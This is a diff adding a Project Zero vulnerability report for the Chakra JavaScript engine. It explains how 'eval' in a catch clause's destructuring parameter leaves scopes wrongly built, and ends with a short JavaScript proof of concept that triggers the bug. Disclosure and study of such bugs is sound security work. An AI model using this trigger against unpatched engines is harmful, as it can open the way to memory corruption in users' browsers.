@@ -1,0 +1,36 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1326
+
+In Javascript, the code executed by a direct call to eval shares the caller block's scopes. Chakra handles this from the parser. And there's a bug when it parses "eval" in a catch statement's param.
+
+ParseNodePtr Parser::ParseCatch()
+{
+    ...
+        pnodeCatchScope = StartParseBlock<buildAST>(PnodeBlockType::Regular, isPattern ? ScopeType_CatchParamPattern : ScopeType_Catch);
+        ...
+        ParseNodePtr pnodePattern = ParseDestructuredLiteral<buildAST>(tkLET, true /*isDecl*/, true /*topLevel*/, DIC_ForceErrorOnInitializer);
+    ...
+}
+
+1. "pnodeCatchScope" is a temporary block used to create a scope, and it is not actually inserted into the AST.
+2. If the parser meets "eval" in "ParseDestructuredLiteral", it calls "pnodeCatchScope->SetCallsEval".
+3. But "pnodeCatchScope" is not inserted into the AST. So the bytecode generator doesn't know it calls "eval", and it can't create scopes properly.
+
+PoC:
+-->
+
+function f() {
+    {
+        let i;
+        function g() {
+            i;
+        }
+
+        try {
+            throw 1;
+        } catch ({e = eval('dd')}) {
+        }
+    }
+}
+
+f();
